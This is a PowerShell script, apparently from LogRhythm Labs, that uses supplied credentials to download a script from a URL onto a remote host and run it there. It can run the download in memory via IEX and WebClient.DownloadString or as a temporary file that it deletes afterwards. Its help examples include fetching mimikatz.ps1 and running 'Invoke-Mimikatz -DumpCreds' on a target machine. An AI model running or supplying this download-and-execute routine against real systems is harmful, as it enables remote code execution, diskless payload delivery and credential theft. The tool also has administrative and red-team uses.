#requires -version 2.0

  #========================================#
  # LogRhythm Labs                         #
  # Download and Execute -- PowerShell     #
  # greg . foss [at] logrhythm . com       #
  # v0.1  --  July 2015                    #
  #========================================#

<#
.NAME
DL-Exec

.SYNOPSIS
Download and execute PowerShell scripts on remote hosts and pass both command-line or functional parameters.

.DESCRIPTION
Dl-Exec is a simple script that leverages user-supplied parameters to download and execute a script with arguments on a remote host. This script can even run without touching disk via the memoryExec parameter, or if run-time parameters are required, the target script can be downloaded and executed on the host directly.

.EXAMPLE
Download and Execute PowerShell in-memory on a remote host and invoke subsequent functions
    PS C:\> dl-exec.ps1 -source http://some.site/mimikatz.ps1 -target 10.10.10.10 -memoryExec -arguments "Invoke-Mimikatz -DumpCreds"

.EXAMPLE
Download and Execute a PowerShell script as a file with command-line switches on a remote host
    PS C:\> dl-exec.ps1 -source http://some.site/Honeyports.ps1 -target 10.10.10.10 -memoryExec -arguments "-Ports 21,22"
#>

[CmdLetBinding()]
Param(
    [Parameter(Mandatory=$true,Position=0)]
    [string]$source,

    [Parameter(Mandatory=$true,Position=1)]
    [string]$target,

    [Parameter(Mandatory=$false,Position=2)]
    [switch]$memoryExec = $false,

    [Parameter(Mandatory=$false,Position=3)]
    [switch]$fileExec = $false,

    [Parameter(Mandatory=$false,Position=4)]
    [string]$arguments,
    
    [Parameter(Mandatory=$false,Position=5)]
    [string]$username,
    
    [Parameter(Mandatory=$false,Position=6)]
    [string]$password
)

$ErrorActionPreference= 'silentlycontinue'

$hostnameCheck = "^(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?$"
if ($target -match $hostnameCheck) {
    try{
        if (-Not ($password)) {
            $cred = Get-Credential
        } Else {
            $securePass = ConvertTo-SecureString -string $password -AsPlainText -Force
            $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $securePass
        }
        if ($memoryExec -eq $true) {
            Invoke-Command -ScriptBlock {
                param ($source,$arguments,$username,$password)
                IEX (New-Object Net.WebClient).DownloadString($source)
                if (-Not ($arguments)) {
                } else {
                    Invoke-Expression $arguments
                }
            } -ArgumentList @($source,$arguments,$username,$password) -ComputerName $target -Credential $cred
        
        } elseif ($fileExec -eq $true) {
            Invoke-Command -ScriptBlock {
                param ($source,$arguments,$username,$password,$content)
                if (Test-Path .\temp.ps1) {
                    rm .\temp.ps1
                }
                $filename = "\temp.ps1"
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($source, $filename)
                $content >> \temp.ps1
                if (-Not ($arguments)) {
                    Invoke-Expression C:\temp.ps1
                } else {
                    Invoke-Expression (C:\temp.ps1 $arguments)
                }
                while (Test-Path C:\temp.ps1) {
                    rm C:\temp.ps1 -Force
                }
            } -ArgumentList @($source,$arguments,$username,$password,$content) -ComputerName $target -Credential $cred
        } else {
                Write-Host ""
                Write-Host "Please run the script with either -memoryExec or -fileExec parameter..."
        }
    } Catch {
        Write-Host ""
        Write-Host "Access Denied..."
        Exit 1
    }
} else {
        Write-Host ""
        Write-Host "Please specify a valid target..."
}
while (Test-Path .\temp.ps1) {
    rm .\temp.ps1 -Force
}
Exit 0